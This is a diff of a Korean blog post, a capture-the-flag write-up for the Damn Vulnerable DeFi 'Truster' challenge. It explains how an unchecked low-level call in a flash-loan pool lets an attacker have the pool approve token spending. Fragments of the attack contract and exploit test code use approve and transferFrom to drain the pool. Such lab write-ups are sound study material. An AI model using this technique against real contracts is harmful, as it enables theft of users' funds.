@@ -25,7 +25,7 @@ toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
 ## 컨트랙트 분석
 
 ### TrusterLenderPool
-```Solidity
+~~~Solidity
   ...
   function flashLoan(
         uint256 borrowAmount,
@@ -46,7 +46,7 @@ toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
         require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
     }
   ...
-```
+~~~
 언젠가 컨트랙트의 코드가 복잡해지면 이렇게 분석하지도 못하겠지만, 일단 `flashLoan` 함수의 동작을 순차적으로 기술해본다.
 1. 대출 금액(`borrowAmount`), 채무자 주소(`borrower`), 타겟 주소(`target`), low-level calldata(`data`)를 매개변수로 전달 받는다.
 2. 대출전 컨트랙트의 잔액(`balanceBefore`)이 대출 금액(`borrowAmount`)보다 큰지 확인한다.
@@ -63,14 +63,14 @@ toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
 이 문제의 포인트는 누가봐도 이상한 이 문장이다: `target.functionCall(data);`. `functionCall`은 openZepplin에서 개발한 `Utilities` 라이브러리에 다음과 같은 형태로 구현되어 있다.
 
 * `functionCall(address, bytes)` in `@openzepplin/contracts/utils`
-```Solidity
+~~~Solidity
 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
     return functionCall(target, data, "Address: low-level call failed");
 }
-```
+~~~
 
 * `functionCall(address, bytes, string)` in `@openzepplin/contracts/utils`
-```Solidity
+~~~Solidity
 function functionCall(
     address target,
     bytes memory data,
@@ -78,10 +78,10 @@ function functionCall(
 ) internal returns (bytes memory) {
     return functionCallWithValue(target, data, 0, errorMessage);
 }
-```
+~~~
 
 * `functionCallWithValue(address, bytes, uint256, string)` in `@openzepplin/contracts/utils`
-```Solidity
+~~~Solidity
 function functionCallWithValue(
     address target,
     bytes memory data,
@@ -94,7 +94,7 @@ function functionCallWithValue(
     (bool success, bytes memory returndata) = target.call{value: value}(data);
     return verifyCallResult(success, returndata, errorMessage);
 }
-```
+~~~
 
 `functionCall`은 결과적으로 `target`의 임의의 함수를 Solidity의 low-level `call`로 호출한다. 실제로 openZepplin의 공식 문서에도 동일한 내용이 적혀있다.
 여기에서 호출될 함수는 `data`에 abi 인코딩되어 있다. 따라서, 우리는 `target` 컨트랙트의 임의의 함수를 (abi 인코딩해서) 호출할 수 있다 (따라서, `target`은 당연히 컨트랙트일 것이다).
@@ -117,7 +117,7 @@ ERC20를 접해본적이 있다면, 느낌이 올 것이다. 바로 `approve`/`t
 
 1. 컨트랙트를 이용하는 방법
 * Attack.sol
-```Solidity
+~~~Solidity
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.0;
@@ -148,10 +148,10 @@ contract Attack {
         );
     }
 }
-```
+~~~
 
 * 익스플로잇 Javscript 코드
-```Javascript
+~~~Javascript
   ...
   it('Exploit', async function () {
     /** CODE YOUR EXPLOIT HERE  */
@@ -164,10 +164,10 @@ contract Attack {
         attacker.address);
   });
   ...
-```
+~~~
 
 2. Javascript만 이용하는 방법
-```Javascript
+~~~Javascript
   ...
   it('Exploit', async function () {
     /** CODE YOUR EXPLOIT HERE  */
@@ -186,18 +186,18 @@ contract Attack {
     await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
   });
   ...
-```
+~~~
 이 방법으로 할 때에는 익스플로잇 Javascript에서 web3.js를 사용할 수 있도록 해야 한다. 방법은 다음과 같다.
-```Bash
+~~~Bash
 # Damn Vulnerable Defi 프로젝트의 root 디렉토리에서
 $ npm install --save-dev @nomiclabs/hardhat-web3
-```
+~~~
 그 다음 `hardhat.config.js`에 아래와 같이 `require` 문장을 추가한다.
-```Javascript
+~~~Javascript
 require("@nomiclabs/hardhat-waffle");
 require('@nomiclabs/hardhat-web3'); // 이거
 require('@openzeppelin/hardhat-upgrades');
 require('hardhat-dependency-compiler');
-```
+~~~
 
 ***EZ*** (...?)
